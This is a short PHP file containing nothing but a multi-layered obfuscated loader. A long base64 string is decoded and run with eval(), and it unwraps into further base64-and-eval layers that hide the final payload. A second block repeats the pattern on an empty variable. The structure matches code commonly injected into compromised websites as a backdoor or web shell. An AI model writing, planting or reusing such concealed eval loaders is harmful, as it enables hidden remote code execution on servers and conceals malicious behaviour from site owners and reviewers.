<?php $spjK = 'ICRjWElCID0gJ0lDUmhUbmw0SUQwZ0owbERVbFpoYkZKdVNVUXdaMG93YkVSVmJHeGFUVVJzVUZOVlVYZGFNRzkzWWtWU1ZtSnVRbFZXYlhoTFUwWk9WbFZZWkdGTlJ6a3pXV3RXVTFWR1RrWlhhM1JXVmtWck1WbHRlR3RXVmxKeVpFZHNVMkpZYUdGV2JHTjRUa1pPYzFSclpGUmlWR3haVm01d1JrMUdiSEpXYms1VVVsUnNXVnBWWkhkaFZscHpZak53V0ZZelFsQlZla0Y0VWpKT1IyRkdRbGhTTVVwNFZsUkNWMlF5VFhoaE0yUmFaV3hhYzFacVJrdFRWbHAwVGxkMGFGWXdXbGxYYTJNeFYyMUdjazVWZUZwV1JWb3pWakJWTVZaV1JuTmpSVFZvWWxob05WWXhXbUZoTWtWNVZXNUthVkpXU2xOWmJYUkxZMFpzZEdWRmRHcE5WMUo0VlRKNGEySkdXbGhsUld4VllrZG9hRmxVUmtaa01VNXhVbTFHVTJKV1JYZFhXSEJEWXpGT1YxUnVVbXhTTUZwd1ZtMTRkazFXV1hsbFIzQk9WakJhZWxrd1duTldWbGw1Vlc1Q1ZWWXphRmhaYlhoT1pERnNObFp0ZUZkaWEwcEtWbTB3TVZZeVJYaFRXR1JQVmtWd1dWbFVTbE5sYkd4MFRWVjBUMVl3VmpWWGEyUnpWRzFHYzFOdVZsaGhNWEIyVlZSS1JtVkhTa2RpUmxwcFYwZG9URlpYY0VKTlYwbDRZa1JhVkdGNmJHOVZiVFZEVTFaYWMxcEhkR2hXVkVaNFZsY3dNVmRIUlhsVmJHaGFaV3RhTTFZeFdsZGtSMVpHWTBaU1UxZEZTalpXTVdoM1ZERlZlVlpzYUZOaVIyaFdXVmQwUzFSc1ZsVlJhM1JQVm0xU2VsZFljRmRoTURGeVRsVnNWV0pIVWpOWlZsVjRZekZPZFZwR2FHaGhNbk4zVmpKd1IyTXlVa2hUYTJoUFZqSm9XRnBYZUZkTk1WVjRWbTF3VGxZeFNqQldWM1JUVlcxS2MxZHVTbGRoYXpWMldsZDRUMVp0Umtaa1IyeFRZbXRKZDFadE1ERmpNV3hYVjJwYVYySnJXbGxaYTJSdlZERmtjVk5yT1d0U2JIQXhWMnRrYzFSck1VaFBWRTVYVFc1b2NWUnNaRkpsVmxKeVlrWlNhVmRIYUhoV1Z6VjNZekExVjJORldtRlNiVkp5VkZkMGQyUXhWbGRaZWxab1lsVndXRll5Y0V0WGF6RklZVVZTWVZKc2NIbGFWbFUxVjBkU1NHRkdaRTVpUld3MVZsUkdWMVF5VG5OaU0yeFVWMGQ0VUZWcVNsTmpiRmwzVm10MGFtSkhVbGhaVlZwUFlWWktXR1ZGYkZkU2VrWjJXVmR6ZUdOck5WaFBWbWhvVFd4S1dGWXljRXRUYlZaV1RsVm9ZVkl3V2xSVVZscDNUbXhaZVdWSE9WWk5hM0JIV1d0V2MxWkhTbGxoU0VaVlZrVmFURlJzV25OV01YQkdUMVUxVTFZemFFWlhWbWgzWVRGT2MxSllaRlJpVkd4aFdWUktiMVpHYkhKYVJUbHFVbXRhZUZWWGVIZFdNREZKVVdwYVYwMXVhRkJWVkVwVFl6Sk9SMkpHVW1sWFIyaDRWbGMxZDJNd05WZGpSVnBoVW0xU2NsbHNWVEZUYkZaWVRsaE9XbFp0VWtkVk1uQkxWMnN4Y1Zac1VscGhNbEpRVlRCVk1WTkdjRWhpUlRWT1lrVnNORlpxU2pSaU1VNXpZak5zVm1FeWFGRlZha3BUVXpGc2NsWnJkR3hpUjFKWVdWVlZOVlJzU1hkWGJHeFhVbnBGTUZsV1drZE9iRVp4Vm14V1YxWnJjRWhYYkZaV1pVWmFWMVJzYkdGU1ZHeHZWbXhrZW1Wc1ZYaFdhemxTWWxVMVYxcFZVbGRWYkZsNVZHNVdWVTB5ZUZSV1ZXUlRUbFpHVldKRmNGSk5helY1Vm14V2EyTXlSWGRpUlZaT1VqSlNZVmxzVm1GT2JHUnpWV3h3VGxKdFpEVldWekUwVjJzeGNXSklTbGhpUlRWMVdWUktUbVF5U2tkV2JFNW9Wak5OZWxVeFZtdFdNREZ6WWtab2EwMXFiRXhWYlhSTFpERmtjbFJ1U2s5TlNFRXlXa1ZrTkdFeVNsWlhibkJVVFVVMVZGWlZaRk5PVjBZMldUSTFVR1ZXU21GVk1VNUNUMVZzUkZreWRHcGlhelZGVTFWUmQxb3hiSFJTYm5CaFZrWnJkMWRFU2xOaVJtdDVUMWQwWVZVeVpISldNR1JQVlVaU2NHRjZaRXBTTVZsNVYxWmtNMkl3Y0VsVGJuQlNaVmR6TTFOdWNEQmlSMUowVW01T1RGRXhTbUZWTVU1eVRubGpOMHBITVZKSlJEQm5TbmxTZGxFelJXZFFVMEpwV1ZoT2JFNXFVbVphUjFacVlqSlNiRXREVWxaaGJGSnVTMVJ6WjFwWVdtaGlRMmRyWWpCT2VFdFVjMjVQTWxZeVdWZDNiMHBITVZKTFZITTlKenNrWlVnZ1BTQW5KRUZSZUNBOUlHSmhjMlUyTkY5a1pXTnZaR1VvSkdGT2VYZ3BPeUJsZG1Gc0tDUkJVWGdwT3ljN1pYWmhiQ2drWlVncE93PT0nOyRpcCA9ICckaVNUID0gYmFzZTY0X2RlY29kZSgkY1hJQik7IGV2YWwoJGlTVCk7JztldmFsKCRpcCk7';$bs = '$knI = base64_decode($spjK); eval($knI);';eval($bs);?> <?php $mMod = '';$Xo = '$WAG = base64_decode($mMod); eval($WAG);';eval($Xo);?> 
